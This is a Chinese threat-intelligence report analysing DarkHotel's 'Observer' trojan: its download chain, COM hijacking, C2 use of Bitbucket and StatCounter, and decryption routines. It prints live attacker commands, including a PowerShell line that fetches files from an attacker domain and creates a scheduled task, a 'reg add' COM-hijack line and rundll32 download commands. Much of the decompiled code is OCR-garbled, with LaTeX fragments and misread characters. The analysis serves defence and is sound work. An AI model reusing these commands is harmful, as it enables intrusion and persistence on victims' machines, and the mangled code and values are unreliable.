@@ -1,0 +1,410 @@
+# 威胁情报丨DarkHotelAPT组织Observer木马攻击分析  
+
+原创404高级威胁情报知道创宇404实验室2024年09月10日17:36湖北  
+
+作者：K&XWS@知道创宇404高级威胁情报团队时间：2024年9月10日  
+
+## 1.情况概述  
+
+今年6月，知道创宇404高级威胁情报团队在分析过程中发现了几个APT组织的攻击样本，通过同源关联到其他的攻击木马，并对此展开了分析。根据近期国内外安全厂商发布的“伪猎者APT”组织的文章，对比确认为同一批通过WPS漏洞进行网络攻击的最终载荷木马[1][2]。  
+
+2023年8月至2024年7月，我们观察到Darkhotel的持续攻击活动，并使用了两套不同的攻击武器及技战术。攻击行业也早已脱离了Darkhotel名字代表的酒店行业。Darkhotel是有着东亚背景，针对企业高管、政府机构、国防工业、电子工业等重要机构实施网络间谍攻击活动的APT组织，其足迹遍布中国、朝鲜、日本、缅甸、俄罗斯等国家。2019年之后有关Darkhotel组织的行动在开源情报中的占比连年降低，同时国内厂商曝光了数个具有东北亚背景且技战术不同的攻击集合，我们认同这些攻击集合都是Darkhotel的子集，Darkhotel只是一个代表了该背景的攻击集合名字。  
+
+## 2.木马分析  
+
+### 2.1 样本攻击/释放链  
+
+  
+
+### 2.2 样本功能综述  
+
+本次捕获的类型1向服务端请求下载一个文件，该文件解密后释放的载荷与类型2几乎一致。与类型2不同的是，类型1在下载阶段还额外下载了一个Ink文件，该lnk文件的主要功能是通过COM劫持以运行释放的载荷（实际类型1下载的文件是将类型2中的文件进行了合并）。相较于类型2，类型3样本在文件解密后释放了两个载荷。根据类型3中PDB路径信息，将其记为Observer，接下来将就各类型样本进行描述。  
+
+#### 2.2.1类型1分析描述  
+
+类型1样本为dll文件，该dll存在一个名为mydllmain的导出函数。  
+
+<html><body><table><tr><td>Name</td><td>Address</td><td>Ordinal</td></tr><tr><td>mydllmain</td><td>1000101B</td><td>1</td></tr><tr><td>DllEntryPoint</td><td>100030D9</td><td>[main entry]</td></tr></table></body></html>  
+
+该DLL文件中的大部分字符使用了攻击者自定义的加密算法处理，该算法自2023年起一直被使用至今，解密算法逻辑为异或3再解base64：  
+
+if（ \*(_BYTE \*)(a1 + a2 - 1） =='>') $^{\star}\a\Vdash\quad=\quad-\lor4$ ;   
+if ( \*(_BYTE \*)(a1 + a2 - 2) == $*_{\sf{a}3}=-{\sf v}4$ ;   
+$\vee5=$ malloc(__CFADD__( $\mathsf{v}4$ ，10) ？ -1 :v4 + 10);   
+$v6=$ dword_10024478;   
+$\smash{\vee}7~=~\vee5$ ;   
+$\vee21~=~\vee5$   
+if （!dword_10024478 )   
+{ $\vee8=$ malloc(0x100u); $v6=(\mathrm{int})v8$ ; $\vee9=\theta$ dword_10 $\theta24478~=~(\mathrm{int})v\xi$ ： do { v8[(unsigned __int8)BASE64_table_10020C58[v9] \~ 3] = v9; $++V9$ ； } while （v9 < 64 );  
+
+滥用合法的windows的照片库查看器组件shimgvw.dll，通过其中的函数ImageView_Fullscreen 从远程服务器上下载文件zetaq.txt：  
+
+sub_100010AB( Arglist, 0x12Cu, "A2BD7BYBApBDtBNtBzB@7BYRA7BDVBJBAGBG1B[BA[BDhBadAhBDBgtAyBEtBVtA6BKNBgBAoBD3BNtBzBEtBtA1BDhBaRAmBKZBgtBVBDRBaBAp" "B@tBPRAWBDFBYtAoBEZBbRAoBKB[tADBKVBaBApBKNBZtAzBDVBYRAVBB>>");   
+v3=strlen(Arglist);   
+vθ=decrypt_1ee026A4（（int)ArgList,v3,（int\*）&v3);// rund1132.exe C:1\Windows\1System3211shimgvw.dll,ImageView_Fullscreen   
+\*（_WORD\*)&vθ[v3]=0;   
+sub_10001024（Buffer,0x12Cu,(wchar_t\*)L"%s"，vθ);   
+free(vo);   
+memset(&StartupInfo,0,sizeof(StartupInfo));   
+StartupInfo.cb =68；   
+StartupInfo.wShowwindow=0;   
+StartupInfo.dwFlags=1;   
+hobject=0;   
+\*（&hobject+1）=0;   
+\*(&hobject + 2)=0;   
+\*（&hobject+3)=θ；   
+sub_100010AB( Arglist, OxFFu, "bBA3BKRBBAyBG1BOtBuBKJBZRAwBD3BYRAvBDFBaBAoB@7BZtAuBD3BOtAnBD;B’dBzB@;BfdAoBKRBZRA{B@7BgBA7BKRB");   
+v3=strlen(Arglist);   
+v1=decrypt_100026A4（(int)ArgList,v3,（int\*)&v3);   
+\*（_WORD\*)&v1[v3]=0;  
+
+从%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE中遍历查找文件名为zetaq的文件,并从其中解密出后续文件：  
+
+sub_10001024(Buffer, 0xFFu,(wchar_t \*)L"%s\\\* \*",ecx0);   
+$\lor4=16$   
+FirstFileW_10024464 $=$ FindFirstFileW_10024464(Buffer, &FindFileData);   
+$\vee8=1\theta$   
+do   
+{ if（ FirstFileW_10024464 $\!=$ (HANDLE)-1) { do { if （ dword_10024474 $\scriptstyle==1$ && dword_10024470 $\scriptstyle==1$ ） break; if（(FindFileData.dwFileAttributes & Ox10) $==0$ llFindFileData.cFileName[0] $==$ ‘.) { if（ FindFileData.cFileName[0] $\scriptstyle=={\mathrm{~\small~\alpha~}}^{\prime}z$ && FindFileData.cFileName[1] $==$ 'e' && FindFileData.cFileName[2] $==$ 't' && FindFileData.cFileName[3] $==$ 'a' && FindFileData.cFileName[4] $==$ \`q'） sub_10001024(Buffer, 0xFFu, (wchar_t \*)L"%s\\%s", ecx0, FindFileData.cFileName); dword_10024474 $=~1$ ； TerminateProcess(hobject, 0); CloseHandle(hobject); CloseHandle(\*(&hobject $+~1\dot{},$ decrypt_dropfile_10001795(Buffer, a2, a1);  
+
+文件的解密及释放流程如下：  
+
+1.从偏移2开始读取24个字节数据并解密，该数据表示包含的文件数。  
+2.继续读取24个字节数据并解密，该数据表示文件总大小。  
+3.继续读取24个字节数据并解密，该数据表示文件加密后大小。  
+4.继续读取24个字节数据并解密，该数据表示文件解密后大小。  
+5.如果包含的文件数大于1时，则循环解密并释放对应文件。  
+
+$v4=2$   
+fseek(Stream, 0, 2); //从偏移2的地方开始读取  
+V39 $=$ ftell(Stream); //文件总大小  
+fclose(Stream);  
+_wfopen_s(&Stream, FileName, L"rb");  
+$\vee5=$ (char \*)malloc(_CFADD_(v39, 1) ?-1 : v39 + 1);  
+$\vee38~=~\vee5$   
+fread(v5, v39, 1u, Stream);  
+$v5[\lor39]=\theta $   
+qmemcpy(v48, $\vee5~+~2$ ，sizeof(v48));  
+ElementSize $=24$   
+$v6=$ decrypt_100026A4((int)v48, 24u, &ElementSize);  
+$v7=$ get_num_37((int)v6, 0, 16); //文件个数  
+free(v6);  
+if （ $\vee7\:=\:2$   
+{$v46=58.$ qmemcpy(v48,v38 + 26, sizeof(v48));ElementSize $=24$ $\vee8=$ decrypt_100026A4((int)v48, 0x18u, &ElementSize);$\begin{array}{r l}{{\mathsf{v}}9}&{{}=}\end{array}$ get_num_37((int)v8, 0, 16); //文件总大小free(v8);if (v9!= v39 - 2 ) //除去前两个无效字符后的大小{ ①Seebug  
+
+最终zetaq解密出2个文件，分别为SecureBootUEFl.da和regit.Ink，将regit.lnk设置名为PCATaskServices的计划任务，滥用合法系统程序pcalua.exe执行该文件。  
+
+LNK参数解析后如下：  
+
+# Header  
+
+Targetcreated: 2022-05-1109:09:09   
+Targetmodified: 2022-05-1109:09:09   
+Targetaccessed:2023-02-0105:11:32  
+
+File size:452,608  
+
+Flags:HasTargetIdList, HasLinkInfo, HasRelativePath, HasArguments,HasIconLocation,IsUnicode, HasExpIcon, EnableT  
+
+Fileattributes:FileAttributeArchive   
+Iconindex:13   
+Show window:SwShowminnoactive (Display the window as minimized without activating it.) RelativePath:....>..\..\Windows\System32\WindowsPowerShelL\v1.0powersheLl.exe   
+Arguments:\$ProgressPreference='SilentlyContinue';i'w''r https://guangzhou.nihaoucloud.org/gsdgsd89iop/sdfger23ty-Ou tFile C:\Users\Public\21333.pdf;s'a'p's C:\Users\Public\21333.pdf;i\*w\*r https://guangzhou.nihaoucloud.org/nmityu89o p/uiop9tyoer -OutFile "C:\Windows\Tasks\Windows_22H.iso";\$hi =m''ou'nt-di'skim'age -im C:\Windows\Tasks\Windows_22H. iso;\$d=（g''et-d'iskimage \$hi.imagepath| g"'et-v''olu'me).DriveLetter;c''p"'i E:\\*C:\Windows\Tasks\;c''p''i'C:\u sers\Public\21333.pdf'-destination.;sch"'ta's''ks/c''r'e''a''te/Scminute/Tn EdgeUpdateTask/trC:\Windows\Tasks \Winver';Di''smou'nt-Dis'kIm''age -im C:\Windows\Tasks\Windows_22H.iso;e''ra''se C:\Windows\Tasks\\*.i?o;e''r''a''s''e \*d?.?n?   
+[conLocation:C:\Program Files(x86)\Microsoft\Edge\Application\msedge.exe  
+
+regit.Ink的主要功能是将之前释放的文件SecureBootUEFl.da重命名为SecureBootUEFl.dat，并劫持系统COM组件F82B4EF1-93A9-4DDE-8015-F7950A1A6E31，利用该COM组件执行SecureBootUEFI.dat。  
+
+2.2.1.1SecureBootUEFl.dat分析描述  
+
+SecureBootUEFl.dat的主要功能有两个：  
+
+1.文件夹遍历：从服务端获取需要需要检索的文件夹路径，并将获取的文件信息拼接后作为UA回传到服务端。  
+2.组件下载并加载执行：从服务端下载后续载荷并加载运行。  
+
+在SecureBootUEFl.dat中字符串的加解密算法变为异或3。  
+
+获取主机名和用户名，后续将获取的数据拼接后异或加密作为首次通信url的一部分：  
+
+$\vee70=$ (struct_a1 \*)operator new(0x50ui64);   
+memset_180024210(v70, 0, sizeof(struct_a1));   
+$=$ sub_1800021EC(v70);   
+GetComputerNameW((LPWSTR)Buffer, &nSize);   
+GetUserNameW((LPWSTR)v122, &nSize);   
+sub_1800013CC((_m128i \*\*)&v91, (const _m128i \*)L"vpfqsqlejof");// useprofile  
+
+解密出两个通信C2，其中一个C2用于从服务端获取数据并执行，一个用于数据的上传（用户信息及文件夹遍历结果），为方便后续描述，分别命名为server1和server2：  
+
+# 1. server1: hxxps://bitbucket.org/whekacj/whekacj/downloads/ 2. server2: hxxps://c.statcounter.com/12959673/0/7901c79c/1/  
+
+sub_1800013cc(（m128i\*\*)&v91,（const_m128i\*)L"kwwsp9,,-pwbw1vmwfq-1n,21:6:540,3,4:324:,2,");//https://c.statcounter.com/12959673/0/7901c79c/1/   
+\*（_OWORD\*）&v67[1]=0i64;   
+V68 = 0i64;   
+v69 = 0i64;   
+v4=（const m128i\*)&v91;   
+if（v93>7) v4=（const m128i \*)v91;   
+sub_1800015A4((_m128i)&v67[1],V4,v92);   
+v5=xor_decrypt_180002164（v71,（const_m128i \*)&v67[1]);   
+if（Source 1=（wchar_t\*\*)v5） Free_180001540((_int64)Source); d_180023B7θ((m128i\*)Source,v5,0x20ui64); v5[1].m128i_i64[0]=0i64; v5[1].m128i_164[1] =7i64; v5->m128i_i16[0]=0;   
+Free_180001540((_int64)v71);   
+v6=（const wchar_t)Source;   
+if（v90>7） v6 = Source[0];   
+wescpy_s(Destination,0x64ui64,v6);   
+sub_180o013cc（（_m128i\*\*)&v91,（const_m128i\*)L"kwwsp9,ajwavhfw-lqd,tkfhbii,tkfhbii,gltmolbgp,");//https://bitbucket.org/whekacjj/whekacjj/dovloads/  
+
+文件夹遍历时通信的url格式如下：Server1 $^+$ xor3([pc_name][username])_[finddir_count].A向服务端1发送请求后，服务端1返回的数据为需要遍历的文件夹，获取到的文件夹信息使用[1进行包裹后用，进行拼接，最终所有的数据拼接搭配到Referer:后，并上传到服务端。  
+
+无论是否获取到服务端下发的文件夹数据，每通信一次则全局变量finddir_count加1:  
+
+v8=((int64（_fastcal1 \*)(_int64,_int64,_m128i \*，_QWORD,unsigned int,_QWORD,_int64,_int64，_int64,_int64))a1->InternetopenUr1w)( v7, a3, v37, 0i64, 0x80000000, 0i64, v39.m128i_164[0], v39.m128i_i64[1], v40, v41); ++al->finddir_count; Free_180001540((1nt64)&v49); Free_180001540（（ int64)v55); Free_180001540((int64)&v46); gotoLABEL_60;  
+
+组件下载功能的通信url格式如下：server1 $^+$ xor3([pc_name][username])_[download_count].B  
+
+# 文件下载后被存储到%Userprofile%\AppData\Local\Microsoft\Windows\Shell\Sample.tmp，将 Sample.tmp复制到%Userprofile%\AppData\Local\Microsoft\Windows\Shell\Service.dat并加载运行:  
+
+sub_1800015A4((_m128i \*)v48,V31,v43);   
+v32=xor_decrypt_180002164(&pException0bject,(const _m128i \*)v48);// %Userprofile%\AppData\Local\Microsoft\windows\Shell\Service.dat   
+if （Source !=(wchar_t $(44)\times32$ ）   
+{ Free_180001540((_int64)Source); d_180023B70((m128i \*)Source, V32,0x20ui64); v32[1].m128i_i64[0] $=$ 0i64; V32[1].m128i_i64[1] $=$ 7i64; v32->m128i_i16[0] =0;   
+}   
+Free_180001540((_int64)&pException0bject);   
+v33=（const wchar-t \*)Source;   
+if （si128.m128i_i64[1] >7ui64) V33 $=$ Source[e];   
+wcscpy_s(&Src,0xc8ui64,v33);   
+ExpandEnvironmentStringsW(&Src,NewFileName,Oxc8u);   
+CopyFilew(&Dst, NewFileName, 0);   
+sub_18000F118(&Dst);   
+if ( !waccess(NewFileName, θ)) (（void（_fastcall \*)(WCHAR \*))a1->LoadLibraryw)(NewFileName);   
+++a1->download_count;  
+
+# 服务端返回的数据使用g73qrc4dwx8jt9qmhi4s作为key进行异或解密，而非样本中的异或3算法：  
+
+((void (_fastcall \*)(_int64,char \*，_int64,unsigned int \*))a1->InternetReadFile)(v11,v55,2048i64,&v39);   
+if （v55[0]!=60)   
+{ memset_180024210(&v45,0, 0x108ui64); sub_180003EE8((_int64)&v45,&Dst); strcpy(v48,"g73qrc4dwx8jt9qmhi4s"); $\vee14=\theta$ LODWORD(V15) $=0$ ； if（v39） { V16 $=$ 0i64; $\vee17=\vee55$ ； do { LOBYTE(V13) $=\ast_{\vee17}$ ++v14; ++v17; LOBYTE(v13) $=$ v48[v16]\~v13; sub_18000431c(&v45,v13); $v18=v15+1$ LODWORD(V15) $=0$ ； if （v16!=19） LODWORD(v15) $=~\cup18$ v19 = v16; $v2\Theta=v16+1$ $v16~=~\mathsf{6i64};$ if （v19 != 19) $v16~=~v20$ ； while（ $\vee14<\vee39$ );  
+
+当上述两个功能相关的通信完成后，样本还会向服务端发送当前受控主机的状态，包含当前文件夹遍历count、组件下载count、主机名、%userprofile%和加密后的主机名和用户名。  
+
+当上述流程完成后进入1小时的sleep，攻击者利用这种长休眠机制不仅能够在一定程度上躲避流量设备的检测，而且可以让攻击者有足够的时间针对指定用户下发组件：  
+
+v65 =((_int64 (_fastcal1 \*)(const wchar_t \*，_QWORD,_QWORD,_QWORD，_DWORD))ve->InternetOpenW)( L"Mozilla/5.0", 0i64, 0i64， 0i64, 0);   
+v66=((_int64 (_fastcal1 \*)(_int64,wchar_t \*，wchar_t \*，_QWoRD,unsigned int，_QWoRD))ve->InternetOpenUrlw)( v65, Destination, V124, 0i64, 0x80000000, 0i64);   
+((void(_fastcal1 \*)(_int64))v0->InternetCloseHandle)(v66);   
+((void(fastcall \*)(int64))ve->InternetCloseHandle)(v65);   
+((void(_fastcall \*)(int64))v0->Sleep)(3600000i64);   
+sub_180006654((_m128i \*)&v67[1], v0->finddir_count);  
+
+后续则循环上述通信步骤。  
+
+#### 2.2.2类型2分析描述  
+
+类型2与类型1在功能上几乎是一致的，以下仅有区别的部分进行描述：  
+
+区别1：Ink文件通过下载而非文件解密后释放。  
+
+v4=strlen(Str);   
+Block = decrypt_100041co((int)Str,v4,&v4);// rundl132.exe C:\windows\System32\shimgvw.dll,ImageView_Fullscree   
+Block[v4+1]=0;   
+Block[v4]=0;   
+vswprintf_10001075（Buffer,0x12Cu,(wchar_t\*)L"%s",Block);   
+free(Block);   
+vswprintf_10001075（CommandLine,0xFFu,（wchar_t\*)L"%s %s",Buffer,a1);   
+if（CreateProcessW（0,CommandLine，0,θ,0,Ox8ooooeou，,θ，&StartupInfo,（LPPROCESS_INFORMATION）&hProcess）)   
+{ memset（&v5,0,sizeof（v5)); v5.cb=68； v5.dwFlags=1; v5.wShowWindow=0; memset（&hobject,0,0x10u); sub_10001135( Str, OxFFu, "bBA3BKRBBAyBG1BOtBuBKJBZRAwBD3BYRAvBDFBaBAoB@7BZtAuBD3BOtAnBD;BdBzB@；BdAoBDBbRA3B@7BgBAwBKBB"， (char)Block); v4= strlen(Str); Blocka = decrypt_100041co((int)Str,v4,&v4);// https://r; /regit.tmp Blocka[v4+1]=0; Blocka[v4]=0; vswprintf_10001075(v7,0x12Cu,（wchar_t\*)L"%s",Blocka); free(Blocka); vswprintf_10001075（CommandLine,0xFFu,（wchar_t\*)L"%s %s",Buffer,v7); CreateProcessW(0,CommandLine,0,0,0,0x8000000u,0,0,&v5,（LPPROCESS_INFORMATION)&hObject);   
+return0; ExpandEnvironmentStringsW(Src,Dst,OxFFu);   
+$v32=$ ((int(_stdcal1 \*)(wchar_t \*))sub_10003389)(Dst);   
+$\vee31~=~\vee32$ ；   
+LOB $\forall\top E(\lor36)=2$   
+$v30=$ ((int (cdecl \*)(char \*, wchar_t \*, int))sub_10003854)(v20, L"-a ", v32);   
+sub_100032F1(v30);   
+sub_100032D8(v20);   
+LOBYTE(v36) $=~1$   
+sub_100032D8(v19);   
+sub_100032C2((wchar_t \*)L"s^bovb-f{f");   
+$v27~=~\&\lor16$   
+$v26=$ ((int (_stdcal1 \*)(wchar_t \*))sub_10003389)((wchar_t \*)L"PT30s");   
+LOBYTE(v36) $=3$   
+$\lor25~=~\&\lor10$   
+$v24=$ sub_100033F1((int)v44);   
+LOBYTE(v36) $=4$ ；   
+$v23~=~8v4$ ；   
+$v29~=~8v4$   
+$v22~=~8v3$   
+sub_100033F1((int)v45);   
+$\vee21=$ sub_100016BA((int)v29, $v3$   
+LOBYTE $(\vee36)=1$   
+sub_10002430((int)L"GoogleRegisterTask",v4, v5, v6, v7,v8,v9, v10, v11, v12, v13, V14, v15, v16); $\vee17~=~\&\vee39$   
+vswprintf_10001075(ExistingFileName, 0xFFu,(wchar_t \*)L"%s\\%s"，a1);   
+CopyFileW(ExistingFileName, Dst, 0);   
+lnk_check_100274F4 $=~1$ ；   
+TerminateProcess(hobject, 0);   
+CloseHandle(hobject);   
+CloseHandle(\*(&hobject $^{+1}$  
+
+#### 2.2.3类型3分析描述  
+
+类型3中初始dll中字符串为明文状态：  
+
+\*this $=0$   
+this[1] $=0$   
+this[2] $=6$   
+this[3] $=6$   
+this[4] $=~\theta.$   
+this[5] $=~\theta$   
+ModuleHandleW $=$ GetModuleHandleW(L"kernel32.dll");   
+\*this $=$ GetProcAddress(ModuleHandleW, "LoadLibraryA");   
+this[1] $=$ GetProcAddress(ModuleHandleW, "GetEnvironmentVariableW"); this[2] $=$ GetProcAddress(ModuleHandleW, "FindFirstFileW");   
+this[3] $=$ GetProcAddress(ModuleHandleW, "FindNextFilew");   
+return this; Seebug  
+
+滥用合法的windows的照片库查看器组件shimgvw.dll，通过其中的函数ImageView_Fullscreen，从远程服务器上下载文件eqlist.txt和mylink.tmp:  
+
+vswprintf_10001006(Buffer,255u,(wchar_t \*)L"https://s /eqlist.txt"，v1);   
+vswprintf_10001006( CommandLine, 255u, (wchar_t\*)L"rundl132.exeC:\\Windows\1System32\\shimgvw.dll,ImageView_Fullscreen %s", (char)Buffer);   
+if ( CreateProcessW(0, CommandLine,0, 0, 0, Ox80ooooou, 0, 0,&StartupInfo, &ProcessInformation）)   
+{ vswprintf_10001006(v7,255u,（wchar_t\*)L"https:// 2/mylink.tmp",v2); vswprintf_10001006( CommandLine, 255u, (wchar_t \*)L"rundl132.exe C:\Windows\ISystem32\\shimgvw.dll,ImageView_Fullscreen %s", (char)v7); if（CreateProcessW(0, CommandLine,0, 0,0,θx8ooooou,0,0,&v5，&hProcess）)  
+
+# 其中eqlist.txt使用类型1中相同的解密步骤解密并释放出%appdata%\\Microsoft\\Crypto\\crypt86.da和%localappdata%\\Microsoft\\Proofs\\profapi.da  
+
+vswprintf_10001006(Src, Ox1F4u, (wchar_t \*)L"%userprofile%%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE");   
+ExpandEnvironmentStringsW(Src, Dst, 0x1F4u);   
+vswprintf_10001006(Src, 0x1F4u, (wchar_t \*)L"%%appdata%%\\Microsoft\\Cryptol\crypt86.da");   
+ExpandEnvironmentStringsW(Src, v5, 0x1F4u);   
+vswprintf_10001006(Src, 0x1F4u, (wchar_t \*)L"%%localappdata%%\\Microsoft\\Proofs");   
+ExpandEnvironmentStringsW(Src, Path, 0x1F4u);   
+wmkdir(Path);   
+vswprintf_10001006(Src, 0x1F4u, (wchar_t \*)L"%%localappdata%%\\Microsoft\\Proofs\\profapii.da");   
+ExpandenviroomentStrings Src, Pth, ox1F4u); TSeebug  
+
+mylink.tmp下载后存储为%temp%\mylink.lnk，Ink文件的功能是将之前释放的文件crypt86.da和profapil.da分别重命名为crypt86.dat和profapi.dat，并劫持系统COM组件0b91a74b-ad7c-4a9d-b563-29eef9167172，利用该COM组件执行crypt86.dat:  
+
+RelativePath:......\..\..\.\Windows\System32\cmd.exe   
+WorkingDirectory:%temp%   
+Arguments:/cregadd HKCu\Software\Classes\CLSID\{ob91a74b-ad7c-4a9d-b563-29eef91671723\InProcServer32/ve/tREG_EXPAN D_SZ/d %Userprofile%\AppData\Roaming\Microsoft\Crypto\crypt86.dat"/f/reg:64&&ren%appdata%\Microsoft\Crypto\crypt8 6.dacrypt86.dat&ren%localappdata%\Microsoft\Proofs\profapii.da profapii.dat   
+IconLocation:%SystemRoot%\System32\SHELL32.dll Seebug  
+
+#### 2.2.3.1crypt86.dat分析描述  
+
+crypt86.dat的主要功能是下载数据并使用profapii.dat解密执行后续功能。  
+
+攻击者将多个下载地址解密后进行配置，可根据需要选择对应的地址使用。  
+
+获取受害者主机名称和用户名等信息，并与字符串hebei进行拼接，格式如下：hebei,%username%;%pc_name%;%userprofile%  
+
+拼接的字符串使用异或 $^{3+}$ base64编码后将其作为UA发送到下载地址（hxxp://82.xxx/cache）:  
+
+v44 = (void \*)xor3_encrypt_180001190(Destination, 2 \* v41, &v73);   
+memset(Destination, 0, sizeof(Destination));   
+dword_180021A50 $=0$   
+while（1）   
+{ LODWORD(v70)= 0; $\vee82~=~\theta\dot{1}64$ ； $\vee83~=~\theta_{\oplus}~$ $v45=\Theta.$ $\vee46=$ (( int64 _fastcall \*)(void \*，_QWORD, _QWORD,_QWORD,WCHAR \*,wchar_t \*))InternetOpenA)( V44, //UA 0i64, 0i64, 0i64, v70, LODWORD(V72) $=$ eebug  
+
+接收从下载地址返回的7个字节数据，并且返回的数据以ref作为起始字符，从中提取出后续请求的文件名，该文件名与下载地址进行拼接后组成完整的请求链接，例如：hxxp://82.xx/list/2.cab，请求的UA依然是前面拼接加密的数据：  
+
+\*(_WORD \*)&v53[v73] = 0;   
+if （ BYTE6(v82) == 'z')   
+{ LODWORD(v70) $=$ SBYTE5(v82); sub_1800020F8((int)v88, 200, (int)L"%s%c.cab",v53, v70);   
+else   
+{ LODWORD(v72) $=$ SBYTE6(v82); LODWORD(v70) $=$ SBYTE5(v82); sub_1800020F8((int)v88, 200,(int)L"%s%c%c.cab", v53, v70, $v72$ );   
+free(v53); Seet  
+
+如果获取数据成功，解密后其中的数据使用，进行分割，分割后的第一个数据为后续需要加载的组件名，第二个数据为组件中的导出函数，最后的数据为传入组件的参数。  
+
+若上面的数据请求失败且次数达到10次后则直接向另外一个地址发起请求，同样这个请求地址有多个（均使用公共服务平台bitbucket.org），该请求返回的数据使用相同的解密及分割方式进行解析：  
+
+  
+
+由于分析时已无数据返回，暂时无法明确后续数据内容，但从以往该组织的攻击活动来看，后续返回的组件名为同文件释放的profapi.dat，导出函数为profapi.dat的导出函数mscuicrypt，关于profapi.dat的功能见下一章节分析。  
+
+#### 2.2.3.2 profapii.dat分析描述  
+
+profapi.dat中包含名为mscuicrypt的导出函数，该函数的主要功能是解密传入的参数并根据参数中的数据完成后续功能：  
+
+<html><body><table><tr><td>Name</td><td>Address</td><td>Ordinal</td></tr><tr><td>mscuicrypt</td><td>0000000180002CEC</td><td></td></tr><tr><td>DllEntryPoint</td><td>0000000180003130</td><td>[main entry]</td></tr></table></body></html>  
+
+传入的参数以H进行分割，解密后完成指定功能，包括：  
+
+1.从参数中，解密出一个远程地址和一个本地路径，从远程地址下载文件，并进行解密后，保存在本地路径下。  
+2.从参数中，解密出一个本地路径，并加载执行。  
+3.从参数中，解密出一个远程路径和一个本地路径。对本地路径下的文件进行遍历，获取所有文件名，拼接上特殊的字符后，进行加密，并设置为UA字符串，连接远程路径。  
+if（ v5）v6 = v5 - 1;if（v6{if （ v6 == 1）{free(v4);sub_180002BC8(v9) ;else{free(v4);sub_180002430(v9);  
+else  
+{free(v4);sub_180001E70( $v9$ );  
+
+//加载指定组件 //组件下载 //目录遍历  
+
+其中目录遍历时，将获取的数据利用[]进行拼接：  
+
+FirstFileW $=$ FindFirstFileW(v4, &FindFileData);  
+memset(v78, 0, 0x1388ui64);  
+if （ FirstFileW ! $=$ (HANDLE)-1i64)  
+{sub_180001008((int)v78, 5000, (int)L"%s\n");do{if （ (FindFileData.dwFileAttributes & Ox10） != 0){$\vee71=\lfloor"\rfloor"$ ;sub_180001008((int)v78, 5000, (int)L"%s%s%s%s\n");}else{sub_180001008((int) $v78$ ，5000,(int)L"%s%s\n");}}while （ FindNextFileW(FirstFileW, &FindFileData） );Seebug  
+
+数据加密后拼接上固定字符并将其作为UA回传至指定服务端。  
+
+#### 2.2.4关联分析  
+
+本次捕获的3种类型的样本与以往曝光的“伪猎者”组织攻击样本几乎一致，具体如下：  
+
+1.下载释放的组件名相同，例如类型3种的crypt86.dat和profapi.dat;  
+2.利用Ink进行COM劫持；  
+
+3.利用公共服务平台bitbucket.org分发指令。  
+
+此外，类型1和类型2中的主要功能组件SecureBootUEFl.dat，其功能与类型3中crypt86.dat和profapii.dat的逻辑上是一致的。  
+
+ModuleHandleW ${}={}$ GetModuleHandleW(v2);   
+free(v2);   
+$\downarrow4=$ dec_180001A5C(a1[2],a1[5]);   
+FirstFileW $=$ FindFirstFileW(v4,&FindFileData);   
+memset（v78,0,0x1388ui64);   
+if（FirstFileW !=（HANDLE)-1i64）   
+{ sub_180001008((int)v78，5000,（int)L"%s\n"); do { if（（FindFileData.dwFileAttributes&0x10）!=0） { v71=L"]"; 类型3 sub_180001008((int)v78,5000,（int)L"%s%s%s%s\n"); else sub_180001008((int)v78，5000,(int)L"%s%s\n"); while（FindNextFileW(FirstFileW，&FindFileData））;  
+
+  
+
+从初始编译时间来看，类型1是最新的，大胆推测攻击者可能根据实际攻击情况正在进行载荷方面的调整。  
+
+<html><body><table><tr><td>类型</td><td>编译时间</td></tr><tr><td>3</td><td>2023-11-16 06:51:36</td></tr><tr><td>2</td><td>2024-02-0520:48:49</td></tr><tr><td>2</td><td>2024-02-01 17:50:24</td></tr><tr><td>1</td><td>2024-05-3105:44:14</td></tr></table></body></html>  
+
+# 同时我们还注意到本次捕获的类型3中的样本包含PDB路径C:\Users\WINUSER\Desktop\SCV\1.Observer\230206_observer_v2.1\observer_v2.0_dl1\observer_v2.0_dll1\x64\Release\observer_v2.0_dl[1.pdb  
+
+；Debug information(IMAGE_DEBUG_TYPE_CODEVIEW)   
+aSc_18001E9A0 db‘RSDS' ；DATA XREF:.rdata:000000018001E7B410 ；CV signature dd 0Ac08CC74h ；Data1；GUID dw0CB92h ；Data2 dw 4B66h ；Data3 db 9Ah，0BAh，0FBh，1Fh,0Dh，4，0Ah，75h;Data4 ddOCBh ; Age text"UTF-8", 'C:\Users\WINUSER\Desktop\SCV\1.Observer\230206_observ'；PdbFileName text "UTF-8", 'er_v2.1\observer_v2.0_dll1\observer_v2.0_dll1\x64\Rele' text "UTF-8", 'ase\observer_v2.0_d111.pdb',0 align 20h   
+；Debug information(IMAGE_DEBUG_TYPE_VC_FEATURE) bug  
+
+# 在2023年捕获的该组织的样本中发现类似结构的PDB路径，我们猜测相关工具在其内部代号或为Observer  
+
+CCasc_180021FCC db'RSDS' ；DATA XREF:.rdata:0000000180021E1410  
+CC ; CV signature  
+DO dd0DFE83615h ;Data1 ； GUID  
+DO dw 0A919h ；Data2  
+DO dw 4A30h ；Data3  
+DO db 0ACh, 6Dh, 0C6h, 18h, 56h,0AEh, 0A1h, 31h; Data4  
+E0 dd7 ； Age  
+E4 text "UTF-8" 'C:\Users\USER\Desktop\SCV\9.CPL\230306_cpl\observer_i′；PdbF  
+E4 text "UTF-8", 'nstaller_v2.1_Reg_Scheduler\x64\Release\observer_insta'  
+E4 text "UTF-8" '1ler_v2.1.pdb',0  
+5E align 20h eebug  
+60 : Dehug information (TMAGF DFRIIG TVPF VC FFATUIRF)  
+
+截止分析时，我们发现类型1样本通信使用的C2依然存活，并存在3个文件，这些文件中的内容既是攻击者需要遍历的文件夹信息：  
+
+  
+威胁情报丨DarkHotelAPT组织Observer木马攻击分析  
+
+  
+GFPHWLSQHUBL_1.A X  
+
+可见攻击者可能依然对部分受害主机保持着通信。  
+
+# Hash:  
+
+：8620a8a3f75b8b63766bd0f489f33d6add2f326bac70baca94eb655bdfae175d445a84e3216da14b73dbe52aeb63e710030a68e321dec0e77b4698fccc5d54dbdd2f326bac70baca94eb655bdfae175d  
+18fdde4bf8d3a369514b0bc8ddcf35dcccf49ea51585ae38fb510b0fa52aec08  
+?7e20f52d4e7074663d9f9a252b59a2d6  
+
+## 4.参考链接  
+
+[1]Operation DevilTiger：APT-Q-12 使用Oday漏洞技战术披露  
+
+[2] https://www.welivesecurity.com/en/eset-research/analysis-of-two-arbitrary-codeexecution-vulnerabilities-affecting-wps-office/  
